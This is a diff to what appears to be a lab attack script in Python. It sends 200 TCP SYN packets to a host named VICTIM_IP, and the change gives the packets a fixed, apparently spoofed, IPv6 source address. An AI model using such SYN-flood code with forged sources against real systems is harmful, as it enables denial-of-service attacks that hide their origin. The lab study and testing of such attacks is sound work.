@@ -11,7 +11,7 @@ NUM_PACKETS = 200
 
 print(f"Sending {NUM_PACKETS} SYNs from h1c ({SRC_MAC}) out of {IFACE}...")
 for i in range(NUM_PACKETS):
-    pkt = Ether(src=SRC_MAC, dst=DST_MAC)/IPv6(dst=VICTIM_IP)/TCP(dport=80, sport=13000, flags="S")
+    pkt = Ether(src=SRC_MAC, dst=DST_MAC)/IPv6(src="2001:1:1::3",dst=VICTIM_IP)/TCP(dport=80, sport=13000, flags="S")
     sendp(pkt, iface=IFACE, verbose=0)
     time.sleep(0.01)
 print("h1c attack complete.")
